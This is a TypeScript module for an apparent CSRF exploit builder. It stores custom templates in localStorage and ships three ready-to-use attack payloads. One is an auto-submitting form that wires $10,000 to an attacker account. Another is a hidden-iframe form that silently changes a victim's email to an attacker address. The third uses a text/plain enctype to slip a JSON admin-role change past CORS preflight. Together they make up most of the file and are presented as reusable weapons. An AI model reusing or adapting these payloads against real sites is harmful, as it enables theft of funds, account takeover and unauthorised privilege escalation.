export interface ExploitTemplate {
  id: string;
  name: string;
  category: 'Banking' | 'Account' | 'REST-API' | 'Stealth' | 'Custom';
  description: string;
  tags: string[];
  code: string;
  createdAt: number;
}

const TEMPLATES_KEY = 'csrf_forge_custom_templates_v1';

export const BUILTIN_TEMPLATES: ExploitTemplate[] = [
  {
    id: 'tpl-wire-transfer',
    name: 'Auto-Submit Wire Transfer',
    category: 'Banking',
    description: 'Autonomous financial transaction exploit payload targeting funds transfer endpoints.',
    tags: ['form', 'auto-submit', 'financial'],
    code: `<!DOCTYPE html>
<html>
<body>
  <form id="transfer_form" action="https://bank.example/api/v1/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker_account_9981" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="currency" value="USD" />
  </form>
  <script>
    document.getElementById('transfer_form').submit();
  </script>
</body>
</html>`,
    createdAt: 1700000000000,
  },
  {
    id: 'tpl-stealth-iframe',
    name: 'Stealth Iframe Form Submission',
    category: 'Stealth',
    description: 'Swallows HTTP redirects inside a hidden iframe to prevent victim from detecting navigation.',
    tags: ['stealth', 'iframe', 'hidden'],
    code: `<!DOCTYPE html>
<html>
<body>
  <iframe name="hidden_target" style="display:none;width:0;height:0;"></iframe>
  <form action="https://portal.example/settings/profile" method="POST" target="hidden_target">
    <input type="hidden" name="email" value="compromised@evil.corp" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>`,
    createdAt: 1700000000000,
  },
  {
    id: 'tpl-json-blob-trick',
    name: 'JSON Preflight Bypass (enctype text/plain)',
    category: 'REST-API',
    description: 'Forces browser to transmit JSON syntax via text/plain encoding to bypass CORS preflight.',
    tags: ['json', 'cors-bypass', 'enctype'],
    code: `<!DOCTYPE html>
<html>
<body>
  <form action="https://api.example/user/role" method="POST" enctype="text/plain">
    <input type="hidden" name='{"role":"admin","comment":"' value='test"}' />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>`,
    createdAt: 1700000000000,
  },
];

export function getCustomTemplates(): ExploitTemplate[] {
  try {
    const raw = localStorage.getItem(TEMPLATES_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function saveCustomTemplate(name: string, description: string, code: string, tags: string[] = []): ExploitTemplate {
  const newTpl: ExploitTemplate = {
    id: `tpl_custom_${Date.now()}`,
    name,
    category: 'Custom',
    description,
    tags,
    code,
    createdAt: Date.now(),
  };

  const existing = getCustomTemplates();
  localStorage.setItem(TEMPLATES_KEY, JSON.stringify([newTpl, ...existing]));
  return newTpl;
}

export function deleteCustomTemplate(id: string): boolean {
  const existing = getCustomTemplates();
  const filtered = existing.filter((t) => t.id !== id);
  if (filtered.length === existing.length) return false;
  localStorage.setItem(TEMPLATES_KEY, JSON.stringify(filtered));
  return true;
}

export function getAllTemplates(): ExploitTemplate[] {
  return [...getCustomTemplates(), ...BUILTIN_TEMPLATES];
}
